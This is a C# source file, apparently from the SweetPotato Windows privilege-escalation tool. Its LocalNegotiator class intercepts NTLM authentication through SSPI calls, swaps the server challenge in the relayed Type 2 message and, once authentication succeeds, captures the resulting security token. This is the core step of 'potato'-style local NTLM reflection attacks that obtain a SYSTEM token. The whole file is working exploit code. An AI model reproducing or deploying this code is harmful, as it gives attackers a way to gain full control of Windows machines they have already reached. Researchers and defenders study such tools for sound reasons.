b'\xef\xbb\xbfusing System;\nusing static SweetPotato.SSPIHelper;\n\nnamespace SweetPotato {\n\n    internal class LocalNegotiator {\n\n        const int ASC_REQ_ALLOCATE_MEMORY = 0x00000100;\n        const int ASC_REQ_CONNECTION = 0x00000800;\n\n        CtxHandle phContext = new CtxHandle();\n        CredHandle hCred = new CredHandle();\n        SecBufferDesc secServerBufferDesc;\n\n        public bool Authenticated { get; private set; } = false;\n        public IntPtr Token { get; private set; } = IntPtr.Zero;\n\n        public byte[] Challenge { get {\n                return secServerBufferDesc.GetSecBuffer().GetBytes();\n            }\n        } \n\n        public bool HandleType1(byte[] ntmlBytes) {\n\n            TimeStamp ts = new TimeStamp();\n\n            int status = AcquireCredentialsHandle(null, "Negotiate", SECPKG_CRED_INBOUND, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, hCred, ts);\n\n            if (status != SEC_E_OK) {\n                Console.WriteLine("[!] Error {0} result from AcquireCredentialsHandle", status);\n                return false;\n            }\n\n            SecBufferDesc secClientBufferDesc = new SecBufferDesc(ntmlBytes);\n            secServerBufferDesc = new SecBufferDesc(8192); \n\n            UInt32 fContextAttr;\n\n            status = AcceptSecurityContext(hCred, null, ref secClientBufferDesc, ASC_REQ_CONNECTION,\n                SECURITY_NATIVE_DREP, phContext, out secServerBufferDesc, out fContextAttr, ts);\n\n            if(status != SEC_E_OK && status != SEC_I_CONTINUE_NEEDED) {\n                Console.WriteLine("[!] Error {0} result from AcceptSecurityContext", status);\n                return false;\n            }\n\n            return true;\n        }\n\n        public int HandleType2(byte[] ntlmBytes) {\n\n            SecBuffer secBuffer = secServerBufferDesc.GetSecBuffer();\n            byte[] newNtlmBytes = secBuffer.GetBytes();\n\n            if (ntlmBytes.Length >= newNtlmBytes.Length) {\n                for (int idx = 0; idx < ntlmBytes.Length; ++idx) {\n                    if (idx < newNtlmBytes.Length) {\n                        ntlmBytes[idx] = newNtlmBytes[idx];\n                    } else {\n                        ntlmBytes[idx] = 0;\n                    }\n                }\n            } else {\n                Console.WriteLine("NTLM Type2 cannot be replaced.  New buffer too big");\n            }\n\n            return 0;\n        }\n\n        public int HandleType3(byte[] ntmlBytes) {\n\n            SecBufferDesc secClientBufferDesc = new SecBufferDesc(ntmlBytes);\n            secServerBufferDesc = new SecBufferDesc(0);\n            CtxHandle phContextNew = new CtxHandle();\n\n            UInt32 fContextAttr;\n            TimeStamp ts = new TimeStamp();\n\n            int status = AcceptSecurityContext(hCred, phContext, ref secClientBufferDesc, ASC_REQ_ALLOCATE_MEMORY | ASC_REQ_CONNECTION,\n                SECURITY_NATIVE_DREP, phContext, out secServerBufferDesc, out fContextAttr, ts);\n\n            if (status == 0) {\n                Authenticated = true;\n                IntPtr hToken;\n                if ((status = QuerySecurityContextToken(phContext, out hToken)) == 0) {\n                    Token = hToken;\n                }\n            }\n\n            return status;\n        }\n    }\n}\n'